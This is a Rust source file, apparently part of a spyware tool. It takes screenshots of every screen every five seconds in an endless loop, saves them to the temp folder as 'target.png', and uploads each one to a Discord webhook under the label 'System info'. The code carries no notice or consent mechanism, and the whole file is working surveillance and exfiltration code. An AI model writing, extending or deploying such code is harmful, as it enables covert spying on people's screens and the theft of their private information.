use screenshots::Screen;
use anyhow::Result;
use std::{
    thread,
    time::Duration,
    path::PathBuf,
    env
};
use serenity::{
    http::Http,
    model::{
        channel::{AttachmentType, Embed},
        webhook::Webhook,
    },
};
use crate::constants;


// Loop to take a screen every 5 seconds
pub async fn run () {
    let mut number = 0;
    loop {
        thread::sleep(Duration::from_millis(5000));
        screenshot();
        let data = number.to_string();
        let screen = env::temp_dir().join("target.png");
        send(data, screen).await;
        number += 1;
    }
}

// Send elements to Discord servers with Discord Webhooks.
async fn send(data: String, file: PathBuf) -> Result<()> {
    let http = Http::new("token");
    let url = constants::SCREENSHOTS_URL;

    // Create webhook.
    let webhook = Webhook::from_url(&http, url).await?;

    // Embed [data] in a discord message.
    let embed = Embed::fake(|e| {
        e.title("System info");
        e.description(data);
        e
    });

    // Execute Webhook, add metadata, content and files.
    webhook
        .execute(&http, true, |w| {
            w.content("content")
                .username("username")
                .embeds(vec![embed])
                .add_file(AttachmentType::Path(&file));
            w
        })
        .await?;
    Ok(())
}

//Take a screenshot
pub fn screenshot() {
    let screens = Screen::all().unwrap();

    for screen in screens {
        println!("capturer {screen:?}");
        let image = screen.capture().unwrap();
        image
            .save(env::temp_dir().join("target.png"))
            .unwrap();
    }
}